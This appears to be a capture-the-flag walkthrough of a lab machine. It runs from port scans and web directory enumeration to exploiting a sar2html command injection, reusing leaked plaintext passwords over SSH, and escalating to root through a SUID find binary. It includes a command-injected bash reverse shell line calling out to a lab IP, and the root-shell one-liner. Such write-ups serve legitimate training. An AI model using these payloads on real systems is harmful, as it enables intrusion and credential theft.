## nmap
### First scan
```
$ nmap -sV -sC 10.10.215.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 11:52 UTC
Nmap scan report for 10.10.215.152
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.21.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Unix
```
### All port scan
```
$ nmap -sV -sC -oN nmapallports.txt -p- 10.10.215.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 11:54 UTC
Nmap scan report for 10.10.215.152
Host is up (0.042s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.21.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


robots.txt:
```
$ curl http://$IP/robots.txt
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

FTP access:
```
$ lftp anonymous@$IP
Password: 
lftp anonymous@10.10.215.152:/> ls -la
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```

# Directory enumeration:
#### Port 80:
```
$ ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                               
joomla                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 36ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 37ms]
```

Keep enumerating!
```
$ gobuster -z --no-error dir -u http://$IP/joomla -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.215.152/joomla
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/04 12:28:20 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.215.152/joomla/images/]
/media                (Status: 301) [Size: 321] [--> http://10.10.215.152/joomla/media/]
/templates            (Status: 301) [Size: 325] [--> http://10.10.215.152/joomla/templates/]
/modules              (Status: 301) [Size: 323] [--> http://10.10.215.152/joomla/modules/]
/tests                (Status: 301) [Size: 321] [--> http://10.10.215.152/joomla/tests/]
/bin                  (Status: 301) [Size: 319] [--> http://10.10.215.152/joomla/bin/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.215.152/joomla/plugins/]
/includes             (Status: 301) [Size: 324] [--> http://10.10.215.152/joomla/includes/]
/language             (Status: 301) [Size: 324] [--> http://10.10.215.152/joomla/language/]
/components           (Status: 301) [Size: 326] [--> http://10.10.215.152/joomla/components/]
/cache                (Status: 301) [Size: 321] [--> http://10.10.215.152/joomla/cache/]
/libraries            (Status: 301) [Size: 325] [--> http://10.10.215.152/joomla/libraries/]
/installation         (Status: 301) [Size: 328] [--> http://10.10.215.152/joomla/installation/]
/build                (Status: 301) [Size: 321] [--> http://10.10.215.152/joomla/build/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.215.152/joomla/tmp/]
/layouts              (Status: 301) [Size: 323] [--> http://10.10.215.152/joomla/layouts/]
/administrator        (Status: 301) [Size: 329] [--> http://10.10.215.152/joomla/administrator/]
/cli                  (Status: 301) [Size: 319] [--> http://10.10.215.152/joomla/cli/]
/_files               (Status: 301) [Size: 322] [--> http://10.10.215.152/joomla/_files/]
```

With big.txt we find an additional directory:
```
/_test                (Status: 301) [Size: 321] [--> http://10.10.215.152/joomla/_test/]
```



#### Port 10000:
```
$ gobuster dir -u https://$IP:10000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k --exclude-length 4629 -q --no-error --no-progress

```
## .info.txt:
Content of .info.txt:
```
$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
ROT-13 decoded (on https://www.dcode.fr/rot-cipher), it becomes:
```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```
## joomla/_files/
Page showing:
```
VjJodmNITnBaU0JrWVdsemVRbz0K
```

base64 decode:
```
VjJodmNITnBaU0JrWVdsemVRbz0K -> V2hvcHNpZSBkYWlzeQo= -> Whopsie daisy
```

## http://10.10.215.152/joomla/_test/
Contains a website about "Collecting SAR data" 

Contains a download link to sar2ascii:
```
http://IP/joomla/_test/sarFILE/sar2ascii.tar
```

After unpacking, we find a shell script of version:
```
# SAR2HTML 3.2.1                                                        #
```

which is vulnerable to RCE:
https://www.exploit-db.com/exploits/47204

Managed to find log.txt:
```
Accepted password from basterd [...] superduperp@$$
```

For funsies, lets try a reverse shell:
```
http://IP/joomla/_test/index.php?plot=;bash -i >& /dev/tcp/10.14.21.85/4444 0>&1
```
Didn't work, but we have login creds.
```
ssh -p 55007 basterd@$IP # We get the port number from the nmap scan earlier
$ id
uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
```
```
$ cat backup.sh 
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

More credentials:
```
USER=stoner
#superduperp@$$no1knows
```

And we can log in:
```
$ ssh -p 55007 stoner@$IP
stoner@10.10.215.152's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Aug 22 16:05:13 2019
stoner@Vulnerable:~$ 
```

```
stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 4 stoner stoner 4096 Sep  4 16:15 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 Sep  4 16:15 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret 
You made it till here, well done.

```

## Privesc
```
$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

#### suid
```
$ find / -type f -perm -04000 -ls 2>/dev/null
   264453     40 -rwsr-xr-x   1 root     root        38900 Mar 26  2019 /bin/su
   276977     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount
   260151     28 -rwsr-xr-x   1 root     root        26492 May 15  2019 /bin/umount
   260156     36 -rwsr-xr-x   1 root     root        34812 May 15  2019 /bin/mount
   260172     44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6
   260171     40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping
   394226     16 -rwsr-xr-x   1 root     root        13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   416088     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
   416085     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
   260101     48 -rwsr-xr--   1 root     messagebus    46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264108    504 -rwsr-xr-x   1 root     root         513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   260699      8 -rwsr-xr-x   1 root     root           5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   265132     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newgidmap
   260428    228 -r-sr-xr-x   1 root     root         232196 Feb  8  2016 /usr/bin/find
   278157     52 -rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at
   263308     40 -rwsr-xr-x   1 root     root          39560 Mar 26  2019 /usr/bin/chsh
   263304     76 -rwsr-xr-x   1 root     root          74280 Mar 26  2019 /usr/bin/chfn
   263305     52 -rwsr-xr-x   1 root     root          53128 Mar 26  2019 /usr/bin/passwd
   260641     36 -rwsr-xr-x   1 root     root          34680 Mar 26  2019 /usr/bin/newgrp
   263253    160 -rwsr-xr-x   1 root     root         159852 Jun 11  2019 /usr/bin/sudo
   264477     20 -rwsr-xr-x   1 root     root          18216 Mar 27  2019 /usr/bin/pkexec
   263306     80 -rwsr-xr-x   1 root     root          78012 Mar 26  2019 /usr/bin/gpasswd
   265133     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newuidmap
```

find stands out:
https://gtfobins.github.io/gtfobins/find/
```
stoner@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
# cat /root/root.txt
It wasn't that hard, was it?
```

# Questions:
## Questions #1
1. File extension after anon login
.info.txt is a txt file.

2. What is on the highest port?
From the nmap -p-: ssh on 55007

3. What's running on port 10000?
nmap -p-: Webmin

4. Can you exploit the service running on that port? (yay/nay answer)
The answer is nay, but according to http://www.securityspace.com/smysecure/catid.html?ctype=cve&id=CVE-2019-9624 there is a RCE for authenticated users.

5. What's CMS can you access?
joomla on port 80 under /joomla

6. The interesting file name in the folder?
Using https://www.exploit-db.com/exploits/47204
log.txt

##Questions 2
7. Where was the other users pass stored(no extension, just the name)?
backup

8. user.txt
For some reason, there is no user.txt. But the contents of /home/stoner/.secret works.

9. What did you exploit to get the privileged user?

10. root.txt
It wasn't that hard, was it?
